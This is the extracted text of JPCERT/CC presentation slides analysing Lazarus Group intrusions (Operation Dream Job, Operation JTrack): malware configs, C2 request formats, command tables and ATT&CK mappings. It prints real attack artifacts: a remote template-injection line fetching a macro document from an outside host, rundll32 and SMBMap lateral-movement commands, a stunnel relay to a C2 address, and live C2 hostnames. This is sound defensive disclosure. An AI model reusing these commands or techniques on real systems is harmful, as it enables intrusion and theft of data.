Anatomy of COBRA-The Lazarus Group's Recent Activities and TTPs-Shusei Tomonaga (JPCERT/CC)Kota Kino (JPCERT/CC)HayatoSasaki (JPCERT/CC)
JPCERT/CC
Malware/Forensics Analyst, Intelligence Analyst.
Check out our blog and GitHub for our malware 
analysis and technical findings:
https://blogs.jpcert.or.jp/en/
https://github.com/JPCERTCC/
Who are we?
Kota Kino
Shusei Tomonaga
Hayato Sasaki
The activities of the Lazarus Group have been seen in many 
countries, and more an more organizations are being 
targeted.
There are many undocumented activities and TTPs of 
Lazarus Group.
Each security analyst needs to counteract by fully disclosing 
their activities.
Motivation
Goal of This Presentation
This presentation shares 
Lazarus group’s campaigns 
and latest TTPs.
Presentation Topics
1
What’s Lazarus?
2
Operation Dream Job
3
Operation JTrack
4
Details of Lazarus TTPs
1
What’s Lazarus?
2
Operation Dream Job
3
Operation JTrack
4
Details of Lazarus TTPs
All roads lead to Lazarus…
What’s Lazarus?
Lazarus
2016/2 “Operation Blockbuster” report (Novetta etc.）
Bluenoroff
• 2017/4 “Lazarus Under The Hood” report (Kaspersky)
Andariel
• 2017/7 FSI(Financial Security Institute, Korea)
TEMP.Hermit
• 2017/9 Fireeye
APT38
• 2018/10 Fireeye
Appleworm, Stonefly
• 2020/6 Symantec(Broadcom)
Are these categorizations wrong?
Key concepts to categorize Lazarus
Lazarus and other attack groups have overlapping 
activities, attack infrastructure, malware, etc.
[1]
Attack campaigns we focus on……
Unknown
Subgroup
Targeting
defense industry
Overlapping attack
infrastructure
Operation Dream job
Operation North Star
Unknown
Subgroup
Group 
using Dtrack
Overlapping attack
infrastructure
Similar TTPs
Attack campaign 
in India(2019)
Group using
ThreatNeedle
Group using
Bookcode
1
What’s Lazarus?
2
Operation Dream Job
3
Operation JTrack
4
Details of Lazarus TTPs
In May and September 2020, attacks by Lazarus group were 
observed.
Employees at an overseas office of a defense company were 
targeted. 
The attackers contacted the target using an account on Linkedin. 
(It seems Linkedin accounts of the HR department had been 
compromised.)
Overview of Operation Dream Job
Targets identified through C2 Server Logs
Linkdin
• Contact from HR account
• Request to change communication tools
WhatsApp 
or Skype
• Share the bitly URL for document download
bitly
• Redirect from bitly to the maldoc
download website
MalDoc
• Remote template injection
Attack Timeline
Attacker Using Linkedin Account
MalDoc
Boeing_DSS_SE.docx
Downloader
• Word document
• Downloads Word document (Template) from outside
17.dotm
Dropper
• Word document
• Creates and executes the malware once its 
macro is enabled
wsuser.db
Malware
• DLL file
Decoy Document
Downloads the document that contains macro (17.dotm) from an 
external server, leveraging MSWord’s template function
Contains 32bit and 64bit binary and a decoy document
The macro contains a campaign ID and a decryption key, which are to be 
used with LazarusMTB later
Features of the MalDoc
Remote template injection
17.dotm
<Relationship TargetMode="External" 
Target="https[:]//www.astedams[.]it/uploads/template/17.dotm" 
Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTem
plate" Id="rId1"/></Relationships>
LazarusMTB
Torisma
Infected Malware
We have detected two types of malware.
Torisma
Torisma downloads and executes modules.
usosqlite3.dat
Malware
• DLL file
• Encoded with XOR
AccountStore.bak
Configuration
• C2 servers, etc.
Execution command line
Trisma
"C:¥Windows¥System32¥rundll32.exe" 
C:¥ProgramData¥USOShared¥usosqlite3.dat,sqlite3_create_functionex 
mssqlite3_server_management jp-JP
XOR decode key
Configuration (AccountStore.bak)
struct config
{
char signature[12];
char nodata;
int time;
int unknown;
__int64 drive_check_time;
int sleep_time;
char URL1[514];
char URL2[514];
char URL3[514];
char URL4[514];
char URL5[514];
char URL6[514];
int URL1_size;
int URL2_size;
int URL3_size;
int URL4_size;
int URL5_size;
int URL6_size;
int flag_disk_check;
int flag_WTSAction;
char ID[26];
};
Signature
0x98 0x11 0x1A 0x45 0x90 0x78 
0xBA 0xF9 0x4E 0xD6 0x8F 0xEE
Trisma
Features of the Communication (1)
1st Request
POST /[PATH] HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Accept: */*
Connection: Keep-Alive
Content-Length: [Length]
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/7.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 
3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3)
Host: [Server]
Cache-Control: no-cache
ACTION=VIEW&PAGE=[MAC Address]&CODE=[random numeric]&CACHE=[Base64 data]REQUEST=[random numeric]
Base64 data
C2 servers respond, “Your request has been accepted. ClientID: {f9102bc8a7d81ef01ba}”
Contains URL, 
MAC address, etc.
Trisma
Base64 encode (*1) + VEST-32 (*2)
Features of the Communication (2)
2nd Request
POST /[PATH] HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Accept: */*
Connection: Keep-Alive
Content-Length: [Length]
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/7.0; .NET CLR 2.0.50727; SLCC2; .NET 
CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3)
Host: [Server]
Cache-Control: no-cache
ACTION=PREVPAGE&CODE=C[random numeric]&RES=[random numeric]
Response data
*1 Convert “ ” to "+"
*2 https://www.ecrypt.eu.org/stream/vest.html
Trisma
Used to encrypt/decrypt C2 server information, exchanged data, etc.
Encryption key
ff7172d9c888b7a88a7d77372112d772
VEST Ciphers
VEST Ciphers
Trisma
Torisma Module
Offset
len
Content
0
4
Command size
4
-
Command
-
4
Module size
Module header
Shellcode format
Trisma
Send the information of an infected device
•File name, computer name, IP address and current directory
Create a file
•C:¥ProgramData¥Adobe¥AdobeUtility.exe
Send 49-byte data
•f91b0118ccd537e89a7bc9174dab483eff1dcf68110babcd
Torisma Module
Trisma
C2 Server
C2 panel
Torisma Module
Trisma
LCPDot
BLINDINGCAN_RC4
BLINDINGCAN_AES
2nd Malware
We have detected three types of malware.
%TEMP%¥..¥ntuser.log1
RC4-encrypted with SSPI (Security Support Provider Interface)
The key is SHA1 of the parameter provided when the malware is executed
Base64 + XOR
LCPDot
LCPDot downloads and executes modules.
"C:¥Windows¥System32¥cmd.exe" /c C:¥ProgramData¥Adobe¥Adobe.bin -p 0x53A4C60B
Execution commandline
RC4 key
for i in decoed_base64_data:
print chr(((ord(i) ^ 0x25) - 0x7a))
File in which configuration is saved
C2 server information
LCPDot
Features of the Communication (1)
1st Request
POST /[URL] HTTP/1.1
Accept: text/html
Accept-Language: en-us
Content-Type: application/x-www-form-urlencoded
Cookie: SESSID=[Base64 data]
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko
Host: [Host]
Content-Length: [Size]
Connection: Keep-Alive
Cache-Control: no-cache
Cookie=Enable&CookieV=[random numeric]&Cookie_Time=64
Base64 data
C2 servers respond, “Authentication Success”.
Download the module after the 2nd request.
[ID]-101010
LCPDot
BLINDINGCAN_RC4
The malware starts operating when loaded by the 
loader.
loghours.db
Loader
• DLL file
state.db
Malware
• Data file
• Encoded with XOR
state.rsm
Configuration
• Data file
• Encoded with XOR
BLINDINGCAN_RC4
Loader C:¥ProgramData¥Microsoft¥Windows¥Caches¥loghours.db
Main
C:¥ProgramData¥Package Cache¥{8c3f057e-d6a6-4338-ac6a-
f1c795a6577b}¥state.db
Config C:¥ProgramData¥Package Cache¥{8c3f057e-d6a6-4338-ac6a-
f1c795a6577b}¥state.rsm
HKEY_LOCAL_MACHINE¥System¥CurrentControlSet¥Services¥LogonHours¥
Parameters
ServiceMain = KSMain
[File Name][Export Name][Service Name]
e.g. loghours.dbKSMainLogonHours
Features of BLINDINGCAN_RC4
Example of files path
Decode key of the data file
Service registration
BLINDINGCAN_RC4
Configuration file
struct config
{
int server_count;
CHAR SERVER[1300];
int flag_https;
struct in_addr proxy_server;
__int16 proxy_port;
int c2_retry_count;
int flag_diskinfo;
int flag_session_info;
int flag_config_save;
__int16 wait_timevalue;
__int64 running_date;
__int16 seed1;
__int16 seed2;
__int16 seed3[46];
char unknown_59C[96];
__int128 unknown_5FC;
__int128 unknown_60C;
__int128 unknown_61C;
__int128 unknown_62C;
__int128 unknown_63C;
__int128 unknown_64C;
int unknown_65C;
_BYTE gap660[20];
char cmd_path[520];
const WCHAR temp_path;
_BYTE gap87E[518];
};
BLINDINGCAN_RC4
Features of the Communication
1st Request
POST /[PATH] HTTP/1.1
Connection: Keep-Alive
Cache-Control: no-cache
Content-Type: application/x-www-form-urlencoded
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Host: [Server]
Content-Length: [Length]
id=[RC4_key][param_1:param_2:param_3]&[param_1]=[sessionID]&[param_2]=[fixedString]&[param_3]=[datagram]
boardid,bbsNo,strBoardID,userid,bbs,filename,code,pid,seqNo,ReportID,v,PageNumber,num,view,read,action,page,mode,idx
,cateId,bbsId,pType,pcode,index,tbl,idx_num,act,bbs_id,bbs_form,bid,bbscate,menu,tcode,b_code,bname,tb,borad01,borad
02,borad03,mid,newsid,table,Board_seq,bc_idx,seq,ArticleID,B_Notice,nowPage,webid,boardDiv,sub_idx
param is randomly selected from the strings below:
fixedString is RC4-encrypted data of the following string:
T1B7D95256A2001E
RC4 + Base64
BLINDINGCAN_RC4
Custom RC4
def custom_rc4(data, key):
x = 0
box = list(range(256))
for i in range(256):
x = (x + int(box[i]) + int(key[i % len(key)])) % 256
box[i], box[x] = box[x], box[i]
x = 0
for i in range(0xC00):
i = i + 1
x = (x + int(box[i % 256])) % 256
wow_x = x
box[i % 256], box[x] = box[x], box[i % 256]
wow_y = i % 256
x = wow_y
y = wow_x
out = []
for char in data:
x = (x + 1) % 256
y = (y + box[x]) % 256
box[x], box[y] = box[y], box[x]
out.append(chr(char ^ box[(box[x] + box[y]) % 256]))
return ''.join(out)
Match the RC4 key 
stream to 0xC00.
Custom RC4 is used to 
encrypt the communication 
BLINDINGCAN_RC4
List of commands
0x8201
Send system information
0x8225 sdelete
0x8244
Disk space information
0x8208 Device information
0x8226 Communication check
0x8247
None
0x8209 Directory list
0x8227 Change directory
0x8248
Sleep
0x8210 List of services
0x8231 Timestamp
0x8249
Get file name
0x8211 Upload
0x8232 Session close
0x8262
Write in file
0x8212 Download
0x8233
0x8264
Copy file
0x8214 Run processes
0x8240 Uninstall
0x8265
Move file
0x8215 Run processes as user
0x8241 Configuration information
0x8272
Delete file
0x8217 List of processes
0x8242 Overwrite configuration
0x8224 Process kill
0x8243 Directory information
Features
BLINDINGCAN_RC4
Downloads module and then starts the operation 
Features of the file
Saved in the system folder 
The file size is large (approx. 150MB)
VMProtect
Strings are all encrypted with AES
The configuration is saved in the following registry entry:
HKEY_LOCAL_MACHINE¥SYSTEM¥CurrentControlSet¥Services¥eve
ntlog¥Application
Value: Emulate
BLINDINGCAN_AES
BLINDINGCAN_AES is used for lateral movement.
BLINDINGCAN_AES
Configuration
struct config
{
int server_count;
char server1[256];
char server2[256];
char server3[256];
char server4[256];
char server5[256];
char cmd[256]; /* unused */
int not_use_1; /* unused */
int running_time;
int not_use_2; /* unused */
int not_use_3; /* unused */
int not_use_4; /* unused */
int not_use_5; /* unused */
int sleep_time;
char id[80]; /* unused */
int set_uniq_id;
/* whether uniq_id is set or not*/
char uniq_id[60];
/* A unique value is generated from computer 
name */
char AES_key[42];
};
BLINDINGCAN_AES
AES128 (CBC)
Only the first 16 bytes are used 
because the key is processed as 
wide characters
Strings Encode
BLINDINGCAN_AES
API obfuscation
Strings are obfuscated with AES
wide characters
32bit
Features of the Communication
1st Request
POST /[Path]HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Accept: */*
Cookie: token=[random 4-digit value][4-digit authentication key][number of communications made]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Content-Length: [Size]
Host:[Server]
[param]=[Base64 data]  
tname;blogdata;content;thesis;method;bbs;level;maincode;tab;idx;tb;isbn;entry;doc;category;articles;portal;notice;product;the
mes;manual;parent;slide;vacon;tag;tistory;property;course;plugin
param is randomly selected from the strings below:
Base64 data format
[AES Key]@[Uniq ID]
Proceeds to the next step when 
the C2 server's response contains 
the authentication key
BLINDINGCAN_AES
BLINDINGCAN_AES Module
UPX
The module contains 
multiple features and 
plays the main role 
once it is downloaded.
BLINDINGCAN_AES
List of commands
0xABCF
Get current directory
0xABE9 Upload zip file
0xAC07
Change C2 server
0xABD5 Get the list of files
0xABEB timestamp
0xAC0D Get disk and file information
0xABD7 Get the list of processes
0xABED Change local time
0xAC15
Change current directory
0xABD9 Stop process
0xABF5 sdelete
0xAC17
-
0xABDB Run process
0xABF7 Run shellcommand
0xAC19
Get loading process
information
0xABDD Run process as user
0xABF9 Communication check
0xAC27
Copy file
0xABE1 Download file
0xAC03 -
0xABE3 Upload file
0xAC05 -
Features
BLINDINGCAN_AES
Lateral movement
• AdFind
• SMBMap
• Responder-Windows
Remote access
• TightVNC Viewer
Information theft
• XenArmor Email Password Recovery Pro
• XenArmor Browser Password Recovery Pro
• winrar
Other purposes
• tcpdump
• procdump
• wget
Tools Used
Tool
SMBMap to EXE with Pyinstaller
Lateral Movement using SMBMap
BigMSI.exe -u USERID -p PASSWORD=[password] -H 
[IP_Address] -x "c:¥windows¥system32rundll32.exe 
C:¥ProgramData¥iconcache.db,CryptGun HIQ0l7inRQJRaPDv"
Spread infection using SMBMap
Tool
Original SMB Scanner
Scan.exe StartIP EndIP ThreadCount logfilePath [Username Password Deep]
SMB Scanner Usage
Log file
Tool
1
What’s Lazarus?
2
Operation Dream Job
3
Operation JTrack
4
Details of Lazarus TTPs
In September 2020, attacks by Lazarus group were 
observed.
The attacker intruded multiple organizations in Japan.
The attacker infected into the target network via the 
compromised MSP.
Overview of Operation JTrack
VSingle
ValeforBeta
Infected Malware
We have detected two types of malware.
VSingle
VSingle is a RAT which executes arbitrary code from a 
remote host.
G:¥Valefor¥Valefor_Single¥Release¥VSingle.pdb
PDB Path
Version
Version 4.1.1 and 3.0.1 have also been found.
VSingle
Features of the Communication
1st Request
GET /polo/[Unix time]/[random string].php?ufw=[Base64 data]&uis=[unique ID] HTTP/1.1
Host: maturicafe.com
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)
Accept: text/html3,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Keep-Alive: 300
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
Base64 data
"[IP address]|[Windows version number]|[version]"
VSingle
List of commands
1
Upload file
2
Set communication interval
3
Execute arbitrary command
4
Download/execute plugin
5
Upload
6
Send malware information
7
Uninstall
8
Download file
Features
VSingle
Windows PE file
• tmp
VBS file
• vbs
BAT file
• bat
Shellcode
Support Plugin Type
Plugins are temporarily saved 
in %TEMP% folder
VSingle
ValeforBeta
ValeforBeta is a RAT developed in Delphi, and its 
functions are even simpler than those of VSingle.
Config
Version 512
[Type]
INTERNET_OPEN_TYPE_DIRECT
INTERNET_OPEN_TYPE_PRECONFIG
INTERNET_OPEN_TYPE_PROXY
ValeforBeta
ValeforBeta
ValeforBeta is a RAT developed in Delphi, and its 
functions are even simpler than those of VSingle.
[Function names]
KWindows
SysConst
SysInit
System
SysUtils
UnitBitmap
UnitBotCmdEngine
UnitBotCommunication
UnitBotCore
UnitBotGlobal
UnitBotInit
UnitBotProtect
UnitCipher
UnitGetApi
UnitHeap
UnitMD5
UnitMemory
UnitSTR
UnitUtils
UTypes
WinInet
ValeforBeta
Features of the Communication
1st Request
POST /doc/total.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cookie: JSESSIONID=[Base64 data]
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 
3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3)
Host: 3.90.97.16
Content-Length: 0
Proxy-Connection: Keep-Alive
Pragma: no-cache
Base64 data
"[8-letter random string][data][random string (4-12 letters)]"
[data] contains Client ID, malware version, IP Address and OS version.
ValeforBeta
Features of the Communication
Response of
command result
Disguised as if BMP
data is sent
ValeforBeta
List of commands
1
Download file
2
Upload file
3
Execute arbitrary command
4
Uninstall
(Executes cmd /c ping -n 4 127.0.0.1 
>NUL & echo VFB > "file name of itself")
6
Set Sleep Time
7
Send system information
Features
ValeforBeta
ELF_VSingle
Kaos
Malware that Infects Servers
Two types of malware are used for server.
ELF_VSingle
VSingle has Linux version, not only Windows version.
ELF_VSingle
VSingle
ELF_VSingle
ELF_VSingle targets Linux server.
Kaos
Kaos is a RAT developed in Golang and has the function 
to execute shell command.
C:/Users/administrator/Downloads/kaos/engine
C:/Users/administrator/Downloads/kaos/utilities.GetCookieParams
C:/Users/administrator/Downloads/kaos/engine.(*Egg).kandidatKaufhaus
C:/Users/administrator/Downloads/kaos/engine.NewEgg
C:/Users/administrator/Downloads/kaos/utilities.BaseDecode
C:/Users/administrator/Downloads/kaos/utilities.BaseEncode
C:/Users/administrator/Downloads/kaos/utilities.COsname
C:/Users/administrator/Downloads/kaos/utilities.Run
C:/Users/administrator/Downloads/kaos/engine.(*Egg).processMarketPrice
C:/Users/administrator/Downloads/kaos/engine.(*Egg).initDuck
C:/Users/administrator/Downloads/kaos/engine.(*Egg).Lunch
C:/Users/administrator/Downloads/kaos/engine.(*Egg).getEggPrice
C:/Users/administrator/Downloads/kaos/engine/Egg.go
C:/Users/administrator/Downloads/kaos/main.go
C:/Users/administrator/Downloads/kaos/utilities/base64.go
C:/Users/administrator/Downloads/kaos/utilities/http.go
C:/Users/administrator/Downloads/kaos/utilities/utils.go
C:/Users/administrator/Downloads/kaos/utilities/utils_linux.go
C:/Users/administrator/Downloads/kaos/utilities.HttpPostWithCookie
C:/Users/administrator/Downloads/kaos/utilities.HttpPostWithFile
C:/Users/administrator/Downloads/kaos/utilities.EierKochen
Function Name
Kaos
Configuration
struct config
{
int interval;
int data;
int c2_addr;
int lenght_of_c2;
int rc4key;
int length_of_rc4key;
int is_connected;
int setcookie_data;
int data2;
int try_num;
};
Kaos
Features of the Communication
HTTP Request
POST /recaptcha.php HTTP/1.1
Host: www.karin-store.com
User-Agent: 
TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBH
ZWNrbykgQ2hyb21lLzYwLjAuMzExMi4xMTMgU2FmYXJpLzUzNy4zNg==
Connection: close
Content-Length: 0
Cookie: captcha_session=NjM0OThhMTQxYWQyYTNkZjJhOTUwMGE0MzY3NGI5NDBlNTk2; 
captcha_val=0e5gu3%2BxjHmCrpuiXNd4HlCRdpZgI3mdbfg%3D
Accept-Encoding: gzip
captcha_session
captcha_val
“linux 386|[IP Address]” or “[result of shell command execution]”
Base64
RC4+BASE64
“[random data(16byte)][RC4 key(16byte)][random data(4byte)]”
C2 servers respond, command at “Set-Cookie”.
Kaos
Features of the Communication
HTTP Request of Executed Shell Command
POST /recaptcha.php HTTP/1.1
Host: www.karin-store.com
User-Agent: 
TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBH
ZWNrbykgQ2hyb21lLzYwLjAuMzExMi4xMTMgU2FmYXJpLzUzNy4zNg==
Connection: close
Content-Length: [Length]
Content-Type: multipart/form-data; boundary=f24fad327291ab32166b7aa751d1d945a35933ee5bd81618274cda6afeeb
Cookie: captcha_session=YTY5NDQ5MDYwNmRkNjIyOWI3MzU1NTNmYzMxMzhiNTAyNGJh; 
captcha_val=NGI5NjdhNTdhNjliZTVkMg%3D%3D
Accept-Encoding: gzip
--f24fad327291ab32166b7aa751d1d945a35933ee5bd81618274cda6afeeb
Content-Disposition: form-data; name="recaptcha"; filename="recaptcha.png"
Content-Type: application/octet-stream
BMf6(0a    DT043b01c728892b495b99ea4c257fe3a8fea3a5f
--f24fad327291ab32166b7aa751d1d945a35933ee5bd81618274cda6afeeb--
Executed result
If the response data is over 7,000 bytes, it is sent disguised as PNG data.
Kaos
Send German Message
Kaos responds to the command that includes German 
words.
Response message is “Abstand [….] anwenden”.
Kaos
Lateral movement
• Mimikatz
• smbexec
Remote access
• 3Proxy
• Plink
• Stunnel
Information theft
• winrar
Other purposes
• timestomp
• procdump
Tools Used
Tool
Stunnel + 3Proxy + SSH
3Proxy is used to connect to the server via SSH.
Connect with SSH port 
forwarding to 3Proxy
#1
Relay from 3Proxy to Stunnel
#2
Connect to C2 via Proxy 
server from Stunnel
#3
3Proxy
Stunnel
Proxy
Tool
Stunnel
[pop3]
client = yes
accept = 127.0.0.1:5821
connect = [PROXY SERVER]:[PROXY PORT]
protocol = connect
protocolHost = 203.193.165.77:443
userAgent = "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:65.0) Gecko/20100101 
Firefox/65.0"
;verifyChain = yes
;CAfile = stun.pem
;checkIP = 127.0.0.1
debug = 7
Stunnel config
Used to relay internal proxy servers and communicate with the C2.
Tool
The download file is saved in %TEMP% folder. 
Original Simple curl
Usage: [application name].exe url filename
Simple curl
Log file
Tool
Commands
• ipconfig
• net group
• net share
• net user
• net view
• netstat
• nslookup
• ping
• query user
• reg query
• route print
• systeminfo
• tasklist
PowerShell
• Get-ADComputer
Windows Commands Used
Example for Get-ADComputer Option
Get-ADComputer -Filter * -Properties ipv4Address, OperatingSystem, 
OperatingSystemServicePack | Format-List name, ipv4*, oper*
[4]
Comparison of VSingle and Dtrack
What’s Dtrack Reported by Kaspersky [2]
Comparison of VSingle and Dtrack
VSingle packer
Dtrack packer
Similarities in TTP
JTrack
3Proxy
Stunnel
Plink
Japanese company’s 
Website
(Compromised 
Website used as C2)
Dtrack campaign in 
India 2019
Plink
Stonefly
Japanese company’s 
Website
(Compromised 
Website used as C2)
SSH tunnels
Plink
3Proxy
From seqrite’s 2020 
Annual Report & 
Kaspersky’s 2019 blog
2020/6
Symantec’s report
about Lazarus
subgroup
[3]
1
What’s Lazarus?
2
Operation Dream Job
3
Operation JTrack
4
Details of Lazarus TTPs
Comparison Tools
Lateral movement
• Mimikatz
• smbexec
Remote access
• 3Proxy
• Plink
• Stunnel
Information theft
• winrar
Other purposes
• timestomp
• procdump
Lateral movement
• AdFind
• SMBMap
• Responder-Windows
Remote access
• TightVNC Viewer
Information theft
• XenArmor Email Password Recovery Pro
• XenArmor Browser Password Recovery Pro
• winrar
Other purposes
• tcpdump
• procdump
• wget
Operation Dream Job
Operation JTrack
Operation Dream Job ATT&CK Mapping
Reconnaissance
Resource 
Development
Initial Access
Execution
Persistence
Privilege Escalation
Defense Evasion
Credential Access
Discovery
Lateral Movement
Collection
Command & Control
Exfiltration
Gather Victim Identity 
Information (T1589)
Acquire Infrastructure 
(T1583)
Valid Accounts (T1078)
Windows Management 
Instrumentation (T1047) Path Interception (T1034) Path Interception (T1034)
Direct Volume Access 
(T1006)
Group Policy Modification 
(T1484)
OS Credential Dumping 
(T1003)
System Service Discovery 
(T1007)
Remote Services (T1021) Data from Local System 
(T1005)
Data Obfuscation (T1001)
Exfiltration Over Other 
Network Medium (T1011)
Gather Victim Network 
Information (T1590)
Compromise 
Infrastructure (T1584)
Replication Through 
Removable Media 
(T1091)
Scheduled Task/Job 
(T1053)
Boot or Logon Initialization 
Scripts (T1037)
Boot or Logon 
Initialization Scripts 
(T1037)
Rootkit (T1014)
Virtualization/Sandbox 
Evasion (T1497)
Network Sniffing (T1040)
Application Window 
Discovery (T1010)
Shared Webroot (T1051)
Data from Removable 
Media (T1025)
Fallback Channels 
(T1008)
Automated Exfiltration 
(T1020)
Gather Victim Org 
Information (T1591)
Establish Accounts 
(T1585)
External Remote Services 
(T1133)
Command and Scripting 
Interpreter (T1059)
Scheduled Task/Job 
(T1053)
Scheduled Task/Job 
(T1053)
Obfuscated Files or 
Information (T1027)
Unused/Unsupported 
Cloud Regions (T1535)
Input Capture (T1056)
Query Registry (T1012)
Software Deployment 
Tools (T1072)
Data from Network 
Shared Drive (T1039)
Multiband Communication 
(T1026)
Scheduled Transfer 
(T1029)
Gather Victim Host 
Information (T1592)
Compromise Accounts 
(T1586)
Drive-by Compromise 
(T1189)
Graphical User Interface 
(T1061)
Hypervisor (T1062)
Process Injection (T1055) Masquerading (T1036)
Pre-OS Boot (T1542)
Brute Force (T1110)
System Network 
Configuration Discovery 
(T1016)
Taint Shared Content 
(T1080)
Input Capture (T1056)
Commonly Used Port 
(T1043)
Data Transfer Size Limits 
(T1030)
Search Open 
Websites/Domains 
(T1593)
Develop Capabilities 
(T1587)
Exploit Public-Facing 
Application (T1190)
Scripting (T1064)
Valid Accounts (T1078)
Exploitation for Privilege 
Escalation (T1068)
Process Injection (T1055) Abuse Elevation Control 
Mechanism (T1548)
Two-Factor 
Authentication 
Interception (T1111)
Remote System Discovery 
(T1018)
Replication Through 
Removable Media 
(T1091)
Data Staged (T1074)
Application Layer Protocol 
(T1071)
Exfiltration Over C2 
Channel (T1041)
Search Victim-Owned 
Websites (T1594)
Obtain Capabilities 
(T1588)
Supply Chain 
Compromise (T1195)
Software Deployment 
Tools (T1072)
Account Manipulation 
(T1098)
Valid Accounts (T1078)
Scripting (T1064)
Use Alternate 
Authentication Material 
(T1550)
Forced Authentication 
(T1187)
System Owner/User 
Discovery (T1033)
Component Object Model 
and Distributed COM 
(T1175)
Screen Capture (T1113)
Proxy (T1090)
Exfiltration Over 
Alternative Protocol 
(T1048)
Active Scanning (T1595)
Trusted Relationship 
(T1199)
Native API (T1106)
Redundant Access 
(T1108)
Access Token 
Manipulation (T1134)
Indicator Removal on Host 
(T1070)
Subvert Trust Controls 
(T1553)
Exploitation for 
Credential Access 
(T1212)
Network Sniffing (T1040)
Exploitation of Remote 
Services (T1210)
Email Collection (T1114)
Communication Through 
Removable Media 
(T1092)
Exfiltration Over Physical 
Medium (T1052)
Search Open Technical 
Databases (T1596)
Hardware Additions 
(T1200)
Shared Modules (T1129) External Remote Services 
(T1133)
Group Policy Modification 
(T1484)
Valid Accounts (T1078)
Modify Authentication 
Process (T1556)
Steal Application Access 
Token (T1528)
Network Service Scanning 
(T1046)
Internal Spearphishing 
(T1534)
Clipboard Data (T1115)
Non-Application Layer 
Protocol (T1095)
Transfer Data to Cloud 
Account (T1537)
Search Closed Sources 
(T1597)
Phishing (T1566)
Source (T1153)
Create Account (T1136) Create or Modify System 
Process (T1543)
Redundant Access 
(T1108)
Impair Defenses (T1562)
Steal Web Session 
Cookie (T1539)
System Network 
Connections Discovery 
(T1049)
Use Alternate 
Authentication Material 
(T1550)
Automated Collection 
(T1119)
Web Service (T1102)
Exfiltration Over Web 
Service (T1567)
Phishing for Information 
(T1598)
Component Object Model 
and Distributed COM 
(T1175)
Office Application Startup 
(T1137)
Event Triggered 
Execution (T1546)
Modify Registry (T1112)
Hide Artifacts (T1564)
Unsecured Credentials 
(T1552)
Process Discovery 
(T1057)
Remote Service Session 
Hijacking (T1563)
Audio Capture (T1123)
Multi-Stage Channels 
(T1104)
Exploitation for Client 
Execution (T1203)
Browser Extensions 
(T1176)
Boot or Logon Autostart 
Execution (T1547)
Trusted Developer Utilities 
Proxy Execution (T1127)
Hijack Execution Flow 
(T1574)
Credentials from 
Password Stores (T1555)
Permission Groups 
Discovery (T1069)
Lateral Tool Transfer 
(T1570)
Video Capture (T1125)
Ingress Tool Transfer 
(T1105)
User Execution (T1204)
BITS Jobs (T1197)
Abuse Elevation Control 
Mechanism (T1548)
Access Token 
Manipulation (T1134)
Modify Cloud Compute 
Infrastructure (T1578)
Modify Authentication 
Process (T1556)
System Information 
Discovery (T1082)
Man in the Browser 
(T1185)
Data Encoding (T1132)
Inter-Process 
Communication (T1559) Traffic Signaling (T1205)
Hijack Execution Flow 
(T1574)
Deobfuscate/Decode Files 
or Information (T1140)
Network Boundary 
Bridging (T1599)
Man-in-the-Middle 
(T1557)
File and Directory 
Discovery (T1083)
Data from Information 
Repositories (T1213)
Traffic Signaling (T1205)
System Services (T1569)
Server Software 
Component (T1505)
LC_MAIN Hijacking 
(T1149)
Weaken Encryption 
(T1600)
Steal or Forge Kerberos 
Tickets (T1558)
Account Discovery 
(T1087)
Data from Cloud Storage 
Object (T1530)
Remote Access Software 
(T1219)
Implant Container Image 
(T1525)
BITS Jobs (T1197)
Modify System Image 
(T1601)
Peripheral Device 
Discovery (T1120)
Man-in-the-Middle 
(T1557)
Dynamic Resolution 
(T1568)
Pre-OS Boot (T1542)
Indirect Command 
Execution (T1202)
System Time Discovery 
(T1124)
Archive Collected Data 
(T1560)
Non-Standard Port 
(T1571)
Create or Modify System 
Process (T1543)
Traffic Signaling (T1205)
Network Share Discovery 
(T1135)
Data from Configuration 
Repository (T1602)
Protocol Tunneling 
(T1572)
Event Triggered Execution 
(T1546)
Rogue Domain Controller 
(T1207)
Password Policy 
Discovery (T1201)
Encrypted Channel 
(T1573)
Boot or Logon Autostart
Execution (T1547)
Exploitation for Defense 
Evasion (T1211)
Browser Bookmark 
Discovery (T1217)
Compromise Client 
Software Binary (T1554)
Signed Script Proxy 
Execution (T1216)
Domain Trust Discovery 
(T1482)
Hijack Execution Flow 
(T1574)
Signed Binary Proxy 
Execution (T1218)
Virtualization/Sandbox 
Evasion (T1497)
XSL Script Processing 
(T1220)
Software Discovery 
(T1518)
Template Injection 
(T1221)
